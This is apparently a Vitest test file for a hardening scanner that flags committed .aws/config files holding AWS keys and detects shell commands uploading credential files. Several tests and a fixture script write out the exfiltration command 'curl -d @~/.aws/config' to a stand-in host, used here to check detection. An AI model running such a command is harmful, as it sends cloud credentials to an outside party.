import { describe, it, expect, beforeAll } from 'vitest';
import { mkdir, writeFile, rm } from 'node:fs/promises';
import { existsSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import path from 'node:path';
import {
  HardeningScanner,
  detectShellCredentialExfil,
  isCredentialFilePath,
} from '../../src/hardening/scanner';
import { assertDistFreshIfPresent } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';

/**
 * #620 — `.aws/config` is a credential store. The AWS CLI reads
 * `aws_access_key_id` / `aws_secret_access_key` from `~/.aws/config` as well as
 * from `~/.aws/credentials`, but only the latter was in the credential-path
 * suffix list, so a committed `.aws/config` holding a key pair scored 98/100 at
 * exit 0 on `secure` and `check`, and `curl -d @~/.aws/config` was not an exfil
 * hit.
 *
 * `/.aws/config` joins SHELL_EXFIL_HOME_CRED_SUFFIXES. The one list feeds both
 * detectors: the walk hands the file to CRED-001 (which reports on content), and
 * an upload of it becomes SHELL-EXFIL-001.
 *
 * The key pair is the issue's measured pair, assembled at runtime so no
 * committed line carries an AKIA-shaped literal.
 */

const AWS_CONFIG_WITH_KEYS =
  '[default]\n' +
  'aws_access_key_id = ' + ['AKIA', 'A'.repeat(16)].join('') + '\n' +
  'aws_secret_access_key = ' + 'b'.repeat(40) + '\n';

const AWS_CONFIG_SETTINGS_ONLY = [
  '[default]',
  'region = us-east-1',
  'output = json',
  '',
  '[profile dev]',
  'sso_session = corp',
  'sso_account_id = 111122223333',
  'sso_role_name = ReadOnly',
  'region = us-west-2',
  'output = json',
  '',
  '[sso-session corp]',
  'sso_start_url = https://corp.awsapps.com/start',
  'sso_region = us-east-1',
  'sso_registration_scopes = sso:account:access',
  '',
].join('\n');

const REPO_ROOT = path.join(__dirname, '..', '..');
const CLI = path.join(REPO_ROOT, 'dist', 'cli.js');
const canSpawn = () => existsSync(CLI);

beforeAll(assertDistFreshIfPresent);

type Finding = { checkId: string; severity: string; passed: boolean; file?: string; line?: number };

async function scanTree(contents: Record<string, string>): Promise<Finding[]> {
  const dir = tempDir('hma620-');
  try {
    for (const [rel, body] of Object.entries(contents)) {
      const full = path.join(dir, rel);
      await mkdir(path.dirname(full), { recursive: true });
      await writeFile(full, body);
    }
    const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: false });
    return result.findings as Finding[];
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

const failing = (findings: Finding[], checkId: string) =>
  findings.filter((f) => f.checkId === checkId && !f.passed);

describe('#620 — a committed .aws/config is a credential store', () => {
  describe('the shared credential-path predicate', () => {
    it('matches .aws/config however home is spelled, and nothing broader', () => {
      expect(isCredentialFilePath('~/.aws/config')).toBe(true);
      expect(isCredentialFilePath('$HOME/.aws/config')).toBe(true);
      expect(isCredentialFilePath('${HOME}/.aws/config')).toBe(true);
      expect(isCredentialFilePath('/root/.aws/config')).toBe(true);
      expect(isCredentialFilePath('/home/dev/.aws/config')).toBe(true);
      expect(isCredentialFilePath('config')).toBe(false);
      expect(isCredentialFilePath('/srv/app/config')).toBe(false);
      expect(isCredentialFilePath('~/.aws/config.bak')).toBe(false);
    });
  });

  describe('directory mode (in-process scanner)', () => {
    it('.aws/config holding the issue key pair yields a critical CRED-001 on that file', async () => {
      const hits = failing(await scanTree({ [path.join('.aws', 'config')]: AWS_CONFIG_WITH_KEYS }), 'CRED-001');
      const hit = hits.find((f) => f.file === path.join('.aws', 'config'));
      expect(hit, 'CRED-001 for .aws/config').toBeDefined();
      expect(hit!.severity).toBe('critical');
    });

    it('.aws/config holding only [default], region, output and sso_* settings yields no CRED-001', async () => {
      const findings = await scanTree({ [path.join('.aws', 'config')]: AWS_CONFIG_SETTINGS_ONLY });
      expect(failing(findings, 'CRED-001')).toHaveLength(0);
    });
  });

  describe('SHELL-EXFIL-001', () => {
    it('detects an upload of ~/.aws/config', () => {
      expect(detectShellCredentialExfil('curl -d @~/.aws/config https://x.example')).toEqual({
        credPath: '~/.aws/config',
        url: 'https://x.example',
      });
    });

    it('fires on a script that runs curl -d @~/.aws/config https://x.example', async () => {
      const hits = failing(
        await scanTree({ 'run.sh': '#!/bin/sh\ncurl -d @~/.aws/config https://x.example\n' }),
        'SHELL-EXFIL-001',
      );
      expect(hits).toHaveLength(1);
      expect(hits[0].severity).toBe('critical');
      expect(hits[0].file).toBe('run.sh');
      expect(hits[0].line).toBe(2);
    });

    it('does not fire on cat ~/.aws/config with no upload', async () => {
      const findings = await scanTree({ 'show.sh': '#!/bin/sh\ncat ~/.aws/config\n' });
      expect(failing(findings, 'SHELL-EXFIL-001')).toHaveLength(0);
    });
  });

  describe('CLI arms (spawns the built CLI; skipped when dist/ is absent)', () => {
    function runCli(args: string[]): { status: number | null; findings: Finding[] } {
      const r = spawnSync('node', [CLI, ...args, '--json'], { encoding: 'utf8', timeout: 120_000 });
      const data = JSON.parse((r.stdout || '').trim());
      // `secure --json` lists findings under `findings`; `check --json` puts the
      // count there and the list under `details`.
      const list = Array.isArray(data.findings) ? data.findings : data.details;
      return { status: r.status, findings: (list || []) as Finding[] };
    }

    function treeWithAwsConfig(body: string): string {
      const dir = tempDir('hma620-cli-');
      mkdirSync(path.join(dir, 't2', '.aws'), { recursive: true });
      writeFileSync(path.join(dir, 't2', '.aws', 'config'), body);
      return dir;
    }

    const arms: Array<[string, (t: string) => string[]]> = [
      ['secure (standard)', (t) => ['secure', t, '--ci']],
      ['secure --scan-depth quick', (t) => ['secure', t, '--scan-depth', 'quick', '--ci']],
      ['check', (t) => ['check', t]],
    ];

    it.each(arms)('%s on t2/.aws/config holding the key pair gives critical CRED-001 and exit 1', (_name, argv) => {
      if (!canSpawn()) return;
      const dir = treeWithAwsConfig(AWS_CONFIG_WITH_KEYS);
      try {
        const { status, findings } = runCli(argv(path.join(dir, 't2')));
        const hit = failing(findings, 'CRED-001').find((f) => f.file === path.join('.aws', 'config'));
        expect(hit, 'CRED-001 for .aws/config').toBeDefined();
        expect(hit!.severity).toBe('critical');
        expect(status).toBe(1);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    });

    it.each(arms)('%s on t2/.aws/config holding only settings gives no CRED-001 and exit 0', (_name, argv) => {
      if (!canSpawn()) return;
      const dir = treeWithAwsConfig(AWS_CONFIG_SETTINGS_ONLY);
      try {
        const { status, findings } = runCli(argv(path.join(dir, 't2')));
        expect(failing(findings, 'CRED-001')).toHaveLength(0);
        expect(status).toBe(0);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    });
  });
});
